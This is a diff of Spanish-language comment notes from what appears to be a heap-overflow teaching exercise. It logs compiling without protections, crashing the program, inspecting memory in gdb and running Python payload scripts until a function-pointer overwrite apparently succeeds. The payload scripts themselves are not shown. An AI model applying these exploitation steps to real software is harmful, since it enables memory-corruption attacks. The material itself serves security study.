@@ -19,10 +19,10 @@
 * gcc 13.2.0
 #### gcc heap_overflow.c -w -g -no-pie -z execstack -o heap_overflow
 #### ./heap_overflow Hola
-#### data: esta en [0x3dd322a0], el puntero fp esta en [0x3dd322f0]
+#### data: esta en [0x352362a0], el puntero fp esta en [0x352362f0]
 #### Esperando fuera
 #### ./heap_overflow XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-#### data: esta en [0x97932a0], el puntero fp esta en [0x97932f0]
+#### data: esta en [0x2f5832a0], el puntero fp esta en [0x2f5832f0]
 #### Segmentation fault (core dumped)
 #### gdb ./heap_overflow
 #### (gdb) list 25,40
@@ -30,22 +30,19 @@
 #### (gdb) run XXXX
 #### (gdb) info proc map
 #### (gdb) x/240x 0x405000
+#### 0x4052a0 es la dirección de XXXX
 #### (gdb) disassemble f_espero_fuera
 #### chmod a+x heap_python.py
 #### python3 heap_python.py
 #### ./heap_overflow $(python3 heap_python.py)
-#### data: esta en [0x144942a0], el puntero fp esta en [0x144942f0]
+#### data: esta en [00xf6cb2a0], el puntero fp esta en [0xf6cb2f0]
 #### Segmentation fault (core dumped)
 #### gdb -q ./heap_overflow
-#### (gdb) run $(python3 heap_python.py)
+#### (gdb) run $(python3 heap_python2.py)
 #### data: esta en [0x4052a0], el puntero fp esta en [0x4052f0]
 #### Program received signal SIGSEGV, Segmentation fault.
 #### (gdb) info registers
-#### ./heap_overflow $(python3 heap_python.py)
-####
-####
-####
-####
-####
-####
-####
+#### ./heap_overflow $(python3 heap_python3.py)
+#### ./heap_overflow $(python3 heap_python4.py)
+#### data: esta en [0x2ebb42a0], el puntero fp esta en [0x2ebb42f0]
+#### Pasando
